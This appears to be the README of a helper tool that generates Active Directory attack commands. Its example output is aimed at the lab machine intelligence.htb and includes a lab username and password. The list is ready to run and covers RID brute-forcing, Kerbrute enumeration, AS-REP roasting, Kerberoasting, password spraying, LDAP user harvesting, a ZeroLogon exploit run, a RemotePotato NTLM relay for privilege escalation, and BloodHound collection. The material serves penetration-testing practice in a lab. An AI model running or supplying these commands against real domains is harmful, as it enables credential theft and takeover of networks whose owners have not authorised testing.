Converts hostname, ip, creds, and more into the most common commands used during innitial AD enumeration.
Example output: 

           (  )   /\   _                 (
            \ |  (  \ ( \.(               )            _____
          \  \ \  `  `   ) \             (  ___                 (  )   /\   _
       (_`    \+   . x   ( .\            \/   \          )      \ |  (  \ ( \.(               )            _____
      - .-               \+  ;          (     )        (  (     \  \ \  `  `   ) \             (  ___
           WELCOME TO      )  )        _)   ) _         )  )      (_`    \+   . x   ( .\            \/   \
         THE AD SYNTAX   (__/          \____/          (_(_()   - .-               \+  ;          (     )
               FILLER,    /             /               /                        )  )        _)   ) _
           SAVING YOU    (             (               /    made with love by bandors (__/          \____/
              TIME SINCE  2024

    
# RID brute
crackmapexec smb intelligence.htb -u anonymous -p '' --rid-brute 10000
impacket-lookupsid intelligence.htb/anonymous@10.10.10.248
netexec smb intelligence.htb -u Tiffany.Molina -p 'NewIntelligenceCorpUser9876' --rid-brute 10000

# With credentials
impacket-lookupsid intelligence.htb/Tiffany.Molina:'NewIntelligenceCorpUser9876'@intelligence.htb

# Kerbrute user enumeration
kerbrute userenum -d intelligence.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.10.10.248

# AS Rep Roasting
for user in $(cat users.txt); do /usr/share/doc/python3-impacket/examples/GetNPUsers.py -no-pass -dc-ip 10.10.10.248 intelligence.htb/Tiffany.Molina | grep -v Impacket; done

# Kerberoasting
faketime -f +7h GetUserSPNs.py -target-domain intelligence.htb -usersfile users.txt -dc-ip dc01.intelligence.htb intelligence.htb/guest -no-pass
faketime -f +7h GetUserSPNs.py -request -dc-ip 10.10.10.248 intelligence.htb/Tiffany.Molina -save -outputfile GetUserSPNs.out
GetUserSPNs.py -no-preauth 'jjones' -usersfile 'users.txt' -dc-host 'dc01.intelligence.htb' 'intelligence.htb'/

# Password Spray
netexec smb 10.10.10.248 -u users.txt -p 'NewIntelligenceCorpUser9876' --continue-on-success

# LDAP Enumeration
ldapsearch -x -H ldap://10.10.10.248 -b "dc=intelligence,dc=htb" | grep 'userPrincipalName' | tr '@' ' ' | awk '{print $2}' > users.txt
~/go/bin/kerbrute userenum --dc dc01.intelligence.htb -d intelligence.htb users.txt

# ZeroLogon Check
sudo python ~/tools/CVE-2020-1472-master/cve-2020-1472-exploit.py dc01 10.10.10.248

# RemotePotato Check
sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.10.10.248:9999
sudo impacket-ntlmrelayx -t ldap://10.10.10.248 --no-wcf-server --escalate-user normal_user
.\RemotePotato0.exe -m 2 -r 10.8.0.22 -x 10.8.0.22 -p 9999 -s 1

# Bloodhound Python
faketime -f +7h bloodhound-python -c ALL -u 'Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' -d intelligence.htb -dc dc01.intelligence.htb -ns 10.10.10.248
